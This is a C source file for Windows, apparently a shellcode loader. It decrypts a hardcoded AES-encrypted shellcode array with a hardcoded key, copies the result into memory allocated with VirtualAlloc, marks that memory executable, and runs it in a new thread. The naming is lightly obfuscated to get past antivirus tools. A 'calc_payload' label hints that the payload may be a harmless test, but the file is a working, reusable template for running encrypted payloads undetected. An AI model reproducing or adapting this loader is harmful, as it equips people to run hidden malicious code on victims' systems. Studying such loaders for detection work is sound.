#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>

// Shellcode
unsigned char s_pay[] = { 0xa2, 0xcd, 0x78, 0xc6, 0x61, 0x75, 0xbf, 0x8b, 0x27, 0xf6, 0xb1, 0xcb, 0xd2, 0x32, 0x71, 0xf5, 0x75, 0xfc, 0xa1, 0x3e, 0xc7, 0xdf, 0x1a, 0xd8, 0x36, 0x18, 0x18, 0x71, 0x98, 0x48, 0x1a, 0x30, 0x40, 0xef, 0x39, 0xc6, 0x1c, 0xf1, 0x5b, 0xdd, 0xae, 0x36, 0x32, 0xec, 0xb9, 0xf2, 0x7b, 0xff, 0xa1, 0x68, 0x87, 0xee, 0xa5, 0xb3, 0x53, 0x22, 0x93, 0xab, 0x5d, 0xc9, 0x8b, 0x2, 0x19, 0x67, 0x8b, 0x94, 0xe6, 0x6a, 0xa5, 0x30, 0xa2, 0x4a, 0xad, 0x2e, 0xd9, 0xd0, 0xb8, 0xc7, 0xb4, 0x16, 0x7e, 0x9b, 0x35, 0xe1, 0x3b, 0xa6, 0xe1, 0xee, 0xa8, 0x40, 0x68, 0x7b, 0x9f, 0xc3, 0x8c, 0xd5, 0x99, 0xd3, 0x73, 0x1f, 0xe8, 0x4b, 0x50, 0x56, 0xf5, 0xe7, 0xb1, 0x61, 0xb8, 0x49, 0x12, 0x9b, 0xc3, 0x1a, 0x43, 0xa4, 0x6e, 0xae, 0x11, 0x6f, 0x23, 0x47, 0xe, 0xee, 0x68, 0x21, 0x10, 0x9f, 0x2f, 0xa5, 0x4, 0x1e, 0x54, 0x9d, 0xc3, 0xf5, 0xe1, 0x46, 0x4c, 0x4b, 0x8e, 0x58, 0x3e, 0xb4, 0x96, 0x34, 0xee, 0xe1, 0x49, 0x9b, 0x81, 0x81, 0x78, 0x1c, 0x25, 0xbc, 0x31, 0xd0, 0x4e, 0xc5, 0x35, 0xe1, 0x15, 0x6f, 0x26, 0x8b, 0x26, 0x84, 0x3e, 0x1d, 0x3b, 0x4f, 0xb4, 0x19, 0x9a, 0x18, 0x5a, 0x75, 0x5a, 0x79, 0x26, 0xa0, 0x7, 0x1f, 0x20, 0xdb, 0x57, 0xe1, 0xd9, 0x26, 0x54, 0xf1, 0x6e, 0x97, 0x4f, 0xc0, 0x50, 0x79, 0xc3, 0x75, 0x10, 0x8b, 0x34, 0x4b, 0x36, 0x6, 0xae, 0xb4, 0x8c, 0x3a, 0x99, 0x97, 0x29, 0x1e, 0x42, 0x23, 0x39, 0xc6, 0x37, 0x1d, 0x10, 0x4b, 0xa0, 0x7e, 0xbb, 0x84, 0x87, 0x6b, 0x1a, 0x88, 0xd, 0x10, 0x9b, 0x35, 0x57, 0x81, 0xa9, 0x25, 0x2b, 0x27, 0x7d, 0x8c, 0x88, 0x2, 0xa1, 0xbe, 0x58, 0xf6, 0xf0, 0x90, 0x27, 0x5f, 0x5e, 0x4d, 0xf1, 0x38, 0x33, 0x97, 0x2a, 0x7b, 0xca, 0xcd, 0xd1, 0x6e, 0x1, 0xff, 0x1b, 0xfd, 0x87, 0x2, 0x10, 0x33, 0xe6, 0x42, 0x1, 0x1b, 0x37, 0xde, 0xe7, 0x36, 0xbd, 0x68, 0x32, 0x38, 0x4, 0x3c, 0xb8, 0x5d };
unsigned int s_len = sizeof(s_pay);

// A3S_K
char a3s_k[] = { 0x4d, 0x79, 0x53, 0x65, 0x63, 0x72, 0x65, 0x74, 0x4b, 0x65, 0x79, 0x31, 0x32, 0x33, 0x34, 0x35 };

// AES function
int A3S(char* payload, unsigned int payload_len, char* key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		return -1;
	}
	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
		return -1;
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		return -1;
	}

	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, s_pay, (DWORD *) & s_len)) {
		return -1;
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0;
}


int main(void) {

	void* exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;

	// Allocate new memory buffer 
	exec_mem = VirtualAlloc(0, s_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "calc_payload addr", (void*)s_pay);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void*)exec_mem);

	printf("\nHit me 1st!\n");
	getchar();

	// Decrypt (A3S) s_pay 
	A3S((char*)s_pay, s_len, a3s_k, sizeof(a3s_k));

	// Copy payload to allocated buffer
	RtlMoveMemory(exec_mem, s_pay, s_len);

	// Make the buffer executable
	rv = VirtualProtect(exec_mem, s_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHit me 2nd!\n");
	getchar();

	// Execute
	if (rv != 0) {
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}

	return 0;
}
